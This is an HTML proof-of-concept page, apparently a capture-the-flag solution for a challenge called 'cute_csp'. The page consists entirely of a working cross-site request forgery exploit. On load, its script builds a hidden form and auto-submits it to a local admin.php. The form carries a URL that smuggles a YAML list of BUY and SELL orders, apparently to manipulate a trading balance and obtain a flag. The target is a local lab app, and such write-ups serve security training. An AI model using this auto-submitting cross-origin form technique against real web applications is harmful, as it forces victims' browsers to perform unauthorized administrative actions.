<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <title>cute_csp PoC</title>
</head>
<body>
<script>
(function(){
  // YAML payload that admin.php will parse (we URL-encode it before placing in the 'url' field)
  const yaml = '- {op: BUY, amount: 1000000, currency: "ZZ"}\\n'
             + '- {op: SELL, amount: 1000000, currency: "ZZ"}\\n'
             + '- {op: BUY, amount: 1, currency: "FL"}';

  // Build a form and set the input dynamically so we avoid broken quoting/HTML-escaping issues.
  const f = document.createElement('form');
  f.method = 'POST';
  f.action = 'http://localhost:5000/admin.php';

  const inp = document.createElement('input');
  inp.type = 'hidden';
  inp.name = 'url';
  // admin.php expects url to point to index.php?html=<YAML>, so encode the YAML for safety
  inp.value = 'http://localhost:5000/index.php?html=' + encodeURIComponent(yaml);

  f.appendChild(inp);
  document.body.appendChild(f);

  // submit immediately (form POST is allowed cross-origin in a normal browser)
  f.submit();
})();
</script>
</body>
</html>
